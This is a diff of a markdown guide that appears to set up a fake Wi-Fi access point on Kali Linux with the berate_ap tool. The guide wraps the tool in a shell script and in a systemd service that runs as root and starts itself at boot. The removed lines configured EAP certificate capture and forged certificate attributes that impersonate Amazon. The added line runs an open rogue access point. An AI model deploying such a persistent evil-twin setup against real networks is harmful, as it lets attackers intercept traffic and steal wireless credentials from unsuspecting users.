@@ -78,28 +78,22 @@ Creating a directory for logs:
 mkdir /home/kali/Documents/logs
 ```
 
-Creating a directory for certificates (I’ll tell you about the certificates below.):
-```
-mkdir /home/kali/Documents/certs
-```
-Upload certificates to this directory
-
 Creating a Fake Access Point script
 ```
-mkdir /home/kali/Documents/
+mkdir /home/kali/Documents/script
 ```
 
 ```
-touch /home/kali/Documents/scripts/fap.sh
+touch /home/kali/Documents/script/fap.sh
 ```
 
 ```
-sudo chmod 775 /home/kali/Documents/scripts/fap.sh
+sudo chmod 775 /home/kali/Documents/script/fap.sh
 ```
 Script:
 ```
 #!/bin/bash
-berate_ap --eap --no-virt --eap-cert-path /home/kali/Documents/certs wlan1 eth0 <fap_name> >> /home/kali/Documents/logs/fap.txt
+berate_ap -n wlan1 wlan0 {fap_name} >> /home/kali/Documents/logs/fap.txt
 ```
 
 Creating a service file:
@@ -113,8 +107,8 @@ Service script:
 Description=fake access point
 [Service]
 User=root
-WorkingDirectory=/home/kali/Documents/scripts
-ExecStart=/home/kali/Documents/scripts/fap.sh
+WorkingDirectory=/home/kali/Documents/script
+ExecStart=/home/kali/Documents/script/fap.sh
 Restart=always
 RestartSec=3
 [Install]
@@ -124,13 +118,4 @@ WantedBy=multi-user.target
 Adding a service to autostart:
 ```
 sudo systemctl enable fap.service
-```
-
-About certificates
-
-The first time you run the `berate_ap` utility without the `--eap-cert-path` flag, certificates will be generated automatically and will be located in the `/tmp` directory. In order not to wait for the certificate to be created each time, you can extract the ones created from `/tmp` and drag them into a static directory like `/home/kali/Documents/certs`.
-
-This is what the first command to create the certificates looks like. (Please note that the certificate attributes are provided as an example)
-```
-sudo berate_ap --eap --no-virt --eap-cert-subj '/O=Amazon/ST=California/C=EN' wlan1 eth0 <fap_name> 2>&1 >> fap.txt 2>&1 &
 ```
